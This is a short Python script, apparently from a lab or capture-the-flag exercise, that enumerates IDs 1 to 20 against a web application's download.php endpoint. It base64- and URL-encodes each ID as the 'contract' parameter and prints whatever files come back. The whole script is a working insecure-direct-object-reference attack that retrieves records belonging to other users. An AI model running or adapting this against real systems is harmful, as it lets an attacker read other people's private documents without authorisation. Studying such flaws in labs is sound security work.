import requests
import base64
import urllib.parse

for i in range(1, 21):
    data = str(i).encode('utf-8')
    base64_encoded = base64.b64encode(data).decode('utf-8')
    url_encoded = urllib.parse.quote(base64_encoded)
    url = f"http://<TARGET_IP>/download.php?contract={url_encoded}"
    
    response = requests.get(url)
    
    # You can handle the response here (e.g., check status code, process content, etc.)
    if response.status_code == 200:
        print(f"Request {i} was successful")
        if response.text:
           print(response.text)
        else:
           print("There is no content")
    else:
        print(f"Request {i} failed with status code {response.status_code}")
